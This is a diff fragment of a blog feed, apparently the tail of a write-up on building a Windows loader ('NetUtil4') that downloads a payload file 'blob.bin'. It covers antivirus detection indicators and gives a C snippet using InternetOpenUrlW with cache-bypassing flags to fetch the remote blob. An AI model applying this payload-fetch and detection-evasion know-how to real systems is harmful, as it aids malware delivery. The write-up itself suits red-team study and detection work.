+<p><img src="./NetUtil4-virustotal.png" alt="NetUtil4-virustotal"></p>
+<p>The <code>PDB</code> path contained the original binary name as in the project. The symbols and IAT table would&rsquo;ve been another give away for the loader. I&rsquo;d look at these indicators and more some other day.</p>
+<h2 id="the-cache-issue">The Cache Issue</h2>
+<p>While appending parameter allowed to bypass the cached version of <code>blob.bin</code>, a permanent solution would be to include the no-cache specific flags in the <code>InternetOpenUrlW</code>&rsquo;s <code>dwFlags</code> parameter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	hInternetFile <span style="color:#f92672">=</span> <span style="color:#a6e22e">InternetOpenUrlW</span>(
+</span></span><span style="display:flex;"><span>		hInternet,
+</span></span><span style="display:flex;"><span>		lpszUrl,
+</span></span><span style="display:flex;"><span>		NULL,
+</span></span><span style="display:flex;"><span>		NULL,
+</span></span><span style="display:flex;"><span>		INTERNET_FLAG_HYPERLINK <span style="color:#f92672">|</span> INTERNET_FLAG_RELOAD <span style="color:#f92672">|</span> INTERNET_FLAG_NO_CACHE_WRITE <span style="color:#f92672">|</span> INTERNET_FLAG_PRAGMA_NOCACHE,
+</span></span><span style="display:flex;"><span>		NULL
+</span></span><span style="display:flex;"><span>	);
+</span></span></code></pre></div>]]></description>
+      
+    </item>
+    
     
     
     <item>
